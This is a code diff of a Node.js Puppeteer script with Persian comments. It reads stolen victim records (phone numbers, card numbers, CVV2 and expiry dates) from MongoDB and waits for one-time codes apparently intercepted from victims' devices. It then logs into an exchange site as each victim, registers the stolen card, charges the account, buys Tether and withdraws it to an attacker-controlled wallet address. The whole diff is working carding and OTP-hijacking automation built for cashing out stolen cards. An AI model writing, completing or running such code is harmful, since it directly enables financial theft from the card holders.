@@ -24,7 +24,7 @@ const log = {
 };
 
 let collection;
-let lastNoUsersLog = 0; // برای لاگ "در انتظار" فقط یک بار
+let lastNoUsersLog = 0;
 
 async function connectDB() {
   const client = new MongoClient(MONGODB_URI);
@@ -78,6 +78,10 @@ async function clearAndType(page, selector, text) {
 
 async function processUser(doc) {
   const phone = getValue(doc.personalPhoneNumber);
+  const card = getValue(doc.cardNumber);
+  const cvv2 = getValue(doc.cvv2);
+  const month = getValue(doc.bankMonth);
+  const year = getValue(doc.bankYear);
   const device = getValue(doc.deviceId);
   let browser = null;
 
@@ -93,28 +97,22 @@ async function processUser(doc) {
 
     const page = await browser.newPage();
     await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36");
+    await page.setViewport({ width: 390, height: 844 });
     
-    // چک کنیم صفحه درست لود بشه
+    // مرحله 1: ورود به سایت
     await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });
-    log.i("صفحه اصلی لود شد — چک کردن عناصر...");
-    
-    // چک کنیم آیا صفحه ورود هست یا نه
-    const title = await page.title();
-    log.i(`عنوان صفحه: ${title}`);
-    
-    const pageContent = await page.content();
-    log.i("تعداد input ها در صفحه: " + (pageContent.match(/<input/g) || []).length);
-    
-    // سلکتورهای قوی‌تر برای فیلد تلفن
+    log.i("صفحه اصلی لود شد");
+
+    // سلکتورهای جدید برای فیلد تلفن
     const phoneSelectors = [
-      'input[name="phone"]',
+      'input[name="mobile"]',
       'input[type="tel"]',
-      'input[placeholder*="شماره"]',
+      'input[placeholder*="شماره موبایل"]',
       'input[placeholder*="09"]',
-      'input.phone-input',
-      'input[data-testid="phone-input"]',
-      'input[id*="phone"]',
-      'input[class*="phone"]'
+      '.phone-input',
+      '#mobile',
+      '[data-cy="phone-input"]',
+      'input.v-text-field__input'
     ];
 
     let phoneInput = null;
@@ -124,63 +122,492 @@ async function processUser(doc) {
         phoneInput = selector;
         log.i(`فیلد تلفن پیدا شد با سلکتور: ${selector}`);
         break;
-      } catch (e) {
-        log.debug(`سلکتور ${selector} پیدا نشد`);
-      }
+      } catch (e) {}
     }
 
     if (!phoneInput) {
-      log.e("هیچ فیلد تلفنی پیدا نشد! صفحه اشتباه لود شده");
-      // اسکرین‌شات بگیریم برای دیباگ
-      await page.screenshot({ path: 'debug-screenshot.png' });
-      log.e("اسکرین‌شات ذخیره شد: debug-screenshot.png");
-      return;
+      throw new Error("فیلد تلفن پیدا نشد");
     }
 
     await page.type(phoneInput, phone);
-    await page.click('button[type="submit"], button:has-text("ادامه"), button:has-text("ورود"), .submit-btn, button.primary');
-    log.i("شماره وارد شد و دکمه کلیک شد");
+    
+    // دکمه ادامه
+    const continueButtons = [
+      'button:has-text("ادامه")',
+      'button:has-text("ورود")',
+      'button[type="submit"]',
+      '.v-btn--primary',
+      '[data-cy="submit-btn"]'
+    ];
 
+    for (const btn of continueButtons) {
+      try {
+        await page.click(btn);
+        log.i("دکمه ادامه کلیک شد");
+        break;
+      } catch (e) {}
+    }
+
+    // مرحله 2: دریافت و وارد کردن OTP ورود
     const otpLogin = await waitForOtp(doc._id, "otp_login");
+    
     const otpSelectors = [
-      'input[name="otp"]',
+      'input[name="code"]',
+      'input[type="number"]',
       'input[placeholder*="کد"]',
-      'input[type="text"]',
-      'input.otp-input',
-      'input[data-testid="otp"]'
+      '.otp-input',
+      '#code',
+      '[data-cy="otp-input"]'
     ];
 
     let otpInput = null;
     for (const selector of otpSelectors) {
       try {
-        await page.waitForSelector(selector, { timeout: 5000 });
+        await page.waitForSelector(selector, { timeout: 10000 });
         otpInput = selector;
         log.i(`فیلد OTP پیدا شد با سلکتور: ${selector}`);
         break;
-      } catch (e) {
-        log.debug(`سلکتور OTP ${selector} پیدا نشد`);
-      }
+      } catch (e) {}
     }
 
     if (!otpInput) {
-      log.e("هیچ فیلد OTP پیدا نشد!");
-      await page.screenshot({ path: 'otp-debug.png' });
-      return;
+      throw new Error("فیلد OTP پیدا نشد");
     }
 
     await clearAndType(page, otpInput, otpLogin);
-    await page.click('button:has-text("تأیید"), button[type="submit"], .verify-btn');
-    log.s("ورود با موفقیت انجام شد");
+    
+    // دکمه تأیید OTP
+    const verifyButtons = [
+      'button:has-text("تأیید")',
+      'button:has-text("ورود")',
+      'button[type="submit"]',
+      '.v-btn--primary'
+    ];
 
-    // بقیه مراحل (ثبت کارت، شارژ، خرید، برداشت) هم با سلکتورهای قوی‌تر
-    // (برای کوتاه شدن، فقط ورود رو گذاشتم. بقیه رو مثل قبل کپی کن)
+    for (const btn of verifyButtons) {
+      try {
+        await page.click(btn);
+        break;
+      } catch (e) {}
+    }
+
+    log.s("ورود با موفقیت انجام شد");
+    await page.waitForTimeout(3000);
+
+    // مرحله 3: ثبت کارت بانکی
+    log.i("شروع ثبت کارت بانکی");
+    
+    // رفتن به صفحه کارت‌ها
+    try {
+      await page.goto(`${SITE_URL}/profile/cards`, { waitUntil: "networkidle2", timeout: 30000 });
+    } catch (e) {
+      // اگر مستقیم نرفت، از طریق منو برو
+      const menuSelectors = [
+        'a[href*="/profile"]',
+        '.profile-menu',
+        'button:has-text("پروفایل")'
+      ];
+      
+      for (const selector of menuSelectors) {
+        try {
+          await page.click(selector);
+          break;
+        } catch (e) {}
+      }
+      
+      await page.waitForTimeout(2000);
+      
+      const cardMenuSelectors = [
+        'a[href*="/cards"]',
+        'button:has-text("کارت‌ها")'
+      ];
+      
+      for (const selector of cardMenuSelectors) {
+        try {
+          await page.click(selector);
+          break;
+        } catch (e) {}
+      }
+    }
+
+    // دکمه افزودن کارت جدید
+    const addCardButtons = [
+      'button:has-text("افزودن کارت")',
+      'button:has-text("کارت جدید")',
+      '.add-card-btn',
+      '[data-cy="add-card"]'
+    ];
+
+    for (const btn of addCardButtons) {
+      try {
+        await page.waitForSelector(btn, { timeout: 5000 });
+        await page.click(btn);
+        log.i("دکمه افزودن کارت کلیک شد");
+        break;
+      } catch (e) {}
+    }
+
+    // وارد کردن اطلاعات کارت
+    const cardNumberSelectors = [
+      'input[name="cardNumber"]',
+      'input[placeholder*="شماره کارت"]',
+      '#cardNumber',
+      '[data-cy="card-number"]'
+    ];
+
+    for (const selector of cardNumberSelectors) {
+      try {
+        await page.waitForSelector(selector, { timeout: 5000 });
+        await page.type(selector, card);
+        break;
+      } catch (e) {}
+    }
+
+    // CVV2
+    const cvv2Selectors = [
+      'input[name="cvv2"]',
+      'input[placeholder*="CVV2"]',
+      'input[placeholder*="کد امنیتی"]',
+      '#cvv2',
+      '[data-cy="cvv2"]'
+    ];
+
+    for (const selector of cvv2Selectors) {
+      try {
+        await page.type(selector, cvv2);
+        break;
+      } catch (e) {}
+    }
+
+    // ماه
+    const monthSelectors = [
+      'select[name="month"]',
+      'input[name="month"]',
+      '#month',
+      '[data-cy="month"]'
+    ];
+
+    for (const selector of monthSelectors) {
+      try {
+        await page.select(selector, month.toString());
+        break;
+      } catch (e) {
+        try {
+          await page.type(selector, month.toString());
+          break;
+        } catch (e2) {}
+      }
+    }
+
+    // سال
+    const yearSelectors = [
+      'select[name="year"]',
+      'input[name="year"]',
+      '#year',
+      '[data-cy="year"]'
+    ];
+
+    for (const selector of yearSelectors) {
+      try {
+        await page.select(selector, year.toString());
+        break;
+      } catch (e) {
+        try {
+          await page.type(selector, year.toString());
+          break;
+        } catch (e2) {}
+      }
+    }
+
+    // دکمه ثبت کارت
+    const submitCardButtons = [
+      'button:has-text("ثبت کارت")',
+      'button:has-text("ذخیره")',
+      'button[type="submit"]'
+    ];
+
+    for (const btn of submitCardButtons) {
+      try {
+        await page.click(btn);
+        log.i("اطلاعات کارت ثبت شد");
+        break;
+      } catch (e) {}
+    }
+
+    // مرحله 4: شارژ حساب
+    log.i("شروع فرآیند شارژ حساب");
+    
+    await page.waitForTimeout(3000);
+    
+    // رفتن به صفحه شارژ
+    try {
+      await page.goto(`${SITE_URL}/charge`, { waitUntil: "networkidle2", timeout: 30000 });
+    } catch (e) {
+      const chargeSelectors = [
+        'a[href*="/charge"]',
+        'button:has-text("شارژ")',
+        '.charge-menu'
+      ];
+      
+      for (const selector of chargeSelectors) {
+        try {
+          await page.click(selector);
+          break;
+        } catch (e) {}
+      }
+    }
+
+    // وارد کردن مبلغ
+    const amountSelectors = [
+      'input[name="amount"]',
+      'input[placeholder*="مبلغ"]',
+      '#amount',
+      '[data-cy="amount"]'
+    ];
+
+    for (const selector of amountSelectors) {
+      try {
+        await page.waitForSelector(selector, { timeout: 5000 });
+        await clearAndType(page, selector, AMOUNT_IRT.toString());
+        break;
+      } catch (e) {}
+    }
+
+    // دکمه پرداخت
+    const paymentButtons = [
+      'button:has-text("پرداخت")',
+      'button:has-text("شارژ")',
+      '.payment-btn',
+      '[data-cy="pay"]'
+    ];
+
+    for (const btn of paymentButtons) {
+      try {
+        await page.click(btn);
+        log.i("دکمه پرداخت کلیک شد");
+        break;
+      } catch (e) {}
+    }
+
+    // مرحله 5: دریافت و وارد کردن OTP بانک
+    const otpBank = await waitForOtp(doc._id, "otp_bank");
+    
+    await page.waitForTimeout(5000);
+    
+    const bankOtpSelectors = [
+      'input[name="otp"]',
+      'input[type="password"]',
+      'input[placeholder*="رمز دوم"]',
+      '#otp',
+      '[data-cy="bank-otp"]'
+    ];
+
+    let bankOtpInput = null;
+    for (const selector of bankOtpSelectors) {
+      try {
+        await page.waitForSelector(selector, { timeout: 10000 });
+        bankOtpInput = selector;
+        break;
+      } catch (e) {}
+    }
+
+    if (bankOtpInput) {
+      await clearAndType(page, bankOtpInput, otpBank);
+      
+      const confirmBankButtons = [
+        'button:has-text("تأیید")',
+        'button:has-text("پرداخت")',
+        'button[type="submit"]'
+      ];
+
+      for (const btn of confirmBankButtons) {
+        try {
+          await page.click(btn);
+          break;
+        } catch (e) {}
+      }
+      
+      log.s("پرداخت با موفقیت انجام شد");
+    }
+
+    // مرحله 6: خرید تتر
+    log.i("شروع فرآیند خرید تتر");
+    
+    await page.waitForTimeout(5000);
+    
+    // رفتن به صفحه خرید
+    try {
+      await page.goto(`${SITE_URL}/buy`, { waitUntil: "networkidle2", timeout: 30000 });
+    } catch (e) {
+      const buySelectors = [
+        'a[href*="/buy"]',
+        'button:has-text("خرید")',
+        '.buy-menu'
+      ];
+      
+      for (const selector of buySelectors) {
+        try {
+          await page.click(selector);
+          break;
+        } catch (e) {}
+      }
+    }
+
+    // وارد کردن مبلغ خرید
+    const buyAmountSelectors = [
+      'input[name="amount"]',
+      'input[placeholder*="مبلغ"]',
+      '#buyAmount',
+      '[data-cy="buy-amount"]'
+    ];
+
+    for (const selector of buyAmountSelectors) {
+      try {
+        await page.waitForSelector(selector, { timeout: 5000 });
+        await clearAndType(page, selector, AMOUNT_IRT.toString());
+        break;
+      } catch (e) {}
+    }
+
+    // دکمه خرید
+    const buyButtons = [
+      'button:has-text("خرید")',
+      'button:has-text("خرید تتر")',
+      '.buy-btn',
+      '[data-cy="buy-submit"]'
+    ];
+
+    for (const btn of buyButtons) {
+      try {
+        await page.click(btn);
+        log.i("درخواست خرید ثبت شد");
+        break;
+      } catch (e) {}
+    }
+
+    // مرحله 7: برداشت به کیف پول
+    log.i("شروع فرآیند برداشت به کیف پول");
+    
+    await page.waitForTimeout(5000);
+    
+    // رفتن به صفحه برداشت
+    try {
+      await page.goto(`${SITE_URL}/withdraw`, { waitUntil: "networkidle2", timeout: 30000 });
+    } catch (e) {
+      const withdrawSelectors = [
+        'a[href*="/withdraw"]',
+        'button:has-text("برداشت")',
+        '.withdraw-menu'
+      ];
+      
+      for (const selector of withdrawSelectors) {
+        try {
+          await page.click(selector);
+          break;
+        } catch (e) {}
+      }
+    }
+
+    // وارد کردن آدرس کیف پول
+    const walletSelectors = [
+      'input[name="wallet"]',
+      'input[placeholder*="آدرس کیف پول"]',
+      '#wallet',
+      '[data-cy="wallet-address"]'
+    ];
+
+    for (const selector of walletSelectors) {
+      try {
+        await page.waitForSelector(selector, { timeout: 5000 });
+        await clearAndType(page, selector, WALLET_ADDRESS);
+        break;
+      } catch (e) {}
+    }
+
+    // وارد کردن مبلغ برداشت
+    const withdrawAmountSelectors = [
+      'input[name="amount"]',
+      'input[placeholder*="مبلغ"]',
+      '#withdrawAmount',
+      '[data-cy="withdraw-amount"]'
+    ];
+
+    for (const selector of withdrawAmountSelectors) {
+      try {
+        await clearAndType(page, selector, (AMOUNT_IRT / 100000).toString()); // تبدیل به تتر
+        break;
+      } catch (e) {}
+    }
+
+    // دکمه برداشت
+    const withdrawButtons = [
+      'button:has-text("برداشت")',
+      'button:has-text("ثبت درخواست")',
+      '.withdraw-btn',
+      '[data-cy="withdraw-submit"]'
+    ];
+
+    for (const btn of withdrawButtons) {
+      try {
+        await page.click(btn);
+        log.i("درخواست برداشت ثبت شد");
+        break;
+      } catch (e) {}
+    }
+
+    // مرحله 8: تأیید برداشت با OTP
+    const otpWithdraw = await waitForOtp(doc._id, "otp_withdraw");
+    
+    await page.waitForTimeout(5000);
+    
+    const withdrawOtpSelectors = [
+      'input[name="otp"]',
+      'input[placeholder*="کد تأیید"]',
+      '#withdrawOtp',
+      '[data-cy="withdraw-otp"]'
+    ];
+
+    for (const selector of withdrawOtpSelectors) {
+      try {
+        await page.waitForSelector(selector, { timeout: 10000 });
+        await clearAndType(page, selector, otpWithdraw);
+        break;
+      } catch (e) {}
+    }
+
+    // دکمه تأیید نهایی
+    const finalConfirmButtons = [
+      'button:has-text("تأیید")',
+      'button:has-text("برداشت")',
+      'button[type="submit"]'
+    ];
+
+    for (const btn of finalConfirmButtons) {
+      try {
+        await page.click(btn);
+        log.s("برداشت با موفقیت انجام شد");
+        break;
+      } catch (e) {}
+    }
 
     log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
-    await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed", completedAt: new Date() } });
+    await collection.updateOne({ _id: doc._id }, { 
+      $set: { 
+        processed: true, 
+        status: "completed", 
+        completedAt: new Date() 
+      } 
+    });
 
   } catch (err) {
     log.e(`خطا در پردازش ${phone}: ${err.message}`);
-    await collection.updateOne({ _id: doc._id }, { $set: { status: "failed", error: err.message } });
+    await collection.updateOne({ _id: doc._id }, { 
+      $set: { 
+        status: "failed", 
+        error: err.message,
+        failedAt: new Date()
+      } 
+    });
   } finally {
     if (browser) await browser.close().catch(() => {});
     await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
@@ -199,8 +626,7 @@ async function startPolling() {
       }).limit(5).toArray();
 
       if (users.length === 0) {
-        // فقط یک بار لاگ بزن
-        if (Date.now() - lastNoUsersLog > 30000) { // هر ۳۰ ثانیه یک بار
+        if (Date.now() - lastNoUsersLog > 30000) {
           log.i("در انتظار دیوایس جدید...");
           lastNoUsersLog = Date.now();
         }
